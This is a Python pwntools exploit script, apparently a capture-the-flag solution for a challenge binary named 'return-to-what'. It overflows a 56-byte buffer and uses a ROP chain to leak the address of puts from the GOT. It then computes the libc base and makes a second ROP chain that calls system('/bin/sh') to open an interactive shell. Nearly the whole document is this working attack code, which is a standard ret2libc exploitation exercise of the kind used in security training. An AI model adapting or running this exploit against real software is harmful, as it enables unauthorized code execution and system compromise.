from pwn import *

context(os="linux", arch="amd64")
#context.log_level = "DEBUG"

p = process("./return-to-what")
#p = gdb.debug("./return-to-what")

# Stage 1 --> Leaking puts


offset = 56
trash = b"A"*offset 
 

log.info("Mapping Binaries")

binarie = ELF("return-to-what")
rop = ROP(binarie)
libc = ELF("libc.so.6")

rop.search(regs=['rdi'], order = 'regs')
rop.puts(binarie.got['puts'])
rop.call(binarie.symbols['vuln'])

log.info("Stage 1 ROP: " + rop.dump())


payload = [
        trash,
        rop.chain()
        ]

payload = b"".join(payload)

p.recvuntil("Today, we'll have a lesson in returns.")
p.recvuntil("Where would you like to return to?")

p.sendline(payload)

p.recvuntil("\n")

leaked_puts = u64(p.recvuntil("\n").strip().ljust(8, b"\x00"))

log.success(f"leaked address of puts from binary {hex(leaked_puts)}")


#STAGE 2 --> Calling system("/bin/sh")

libc.address = leaked_puts - libc.symbols['puts']

log.success("puts libc address {}".format(hex(libc.symbols['puts'])))
log.success("libc base address {} (leaked_puts_address - puts_libc_address)".format(hex(libc.address)))
log.info("Redirecting the flow of the program to vuln funtion")

rop2 = ROP(libc)
rop2.system(next(libc.search(b'/bin/sh\x00')))

log.info("Stage 2 ROP Chain:\n" + rop2.dump())

payload = trash + rop2.chain()

p.sendline(payload)

p.interactive()
